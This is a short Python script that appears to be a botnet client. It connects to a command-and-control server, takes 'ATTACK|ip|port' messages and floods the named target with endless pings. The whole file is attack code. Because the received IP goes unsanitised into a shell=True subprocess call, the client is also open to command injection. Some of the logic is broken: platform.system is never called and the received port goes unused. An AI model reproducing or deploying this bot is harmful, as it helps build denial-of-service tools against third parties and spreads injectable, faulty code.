import socket
import subprocess
import platform

C2_IP = "192.168.1.100"
C2_PORT = 5555

socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_obj.connect((C2_IP, C2_PORT))
print(f"[Bot] Connected to C2 at {C2_IP}:{C2_PORT}")

def send_packets(target_ip):
    if platform.system == "Windows":
        subprocess.call(f"ping -n 1 -w 1000 {target_ip} > nul 2>&1", shell=True)
    else:
        subprocess.call(f"ping -c 1 -W 1 {target_ip} > /dev/null 2>&1", shell=True)

while True:
    data = socket_obj.recv(1024).decode()
    
    if data.startswith("ATTACK"):
        _, target_ip, target_port = data.split("|")
        print(f"\n[Bot] ATTACKING {target_ip}:{target_port}")
        
        packet_count = 0
        while True:
            send_packets(target_ip)
            packet_count += 1
            
            if packet_count % 100 == 0:
                print(f"[Bot] Sent {packet_count} packets", end="\r")